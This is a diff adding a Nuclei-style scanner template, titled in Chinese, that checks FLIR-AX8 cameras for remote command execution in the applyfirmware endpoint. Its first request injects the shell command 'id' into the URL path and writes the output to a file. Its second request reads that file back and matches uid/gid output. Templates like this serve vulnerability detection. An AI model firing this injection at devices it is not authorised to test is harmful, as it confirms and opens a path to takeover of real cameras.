@@ -1,0 +1,38 @@
+id: flir-ax8-applyfirmware-rce
+
+info:
+  name: "FLIR-AX8 ApplyFirmware 远程命令执行漏洞"
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: flir-ax8
+
+variables:
+  t1: "{{rand_int(100, 999)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "first_request"
+    method: GET
+    path:
+      - "/settings/applyfirmware/;id%3Etest{{t1}}.txt;/false"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: "second_request"
+    method: GET
+    path:
+      - "/test{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "uid=\\d+\\(.*?\\)\\s+gid=\\d+\\(.*?\\)" 
+        part: body
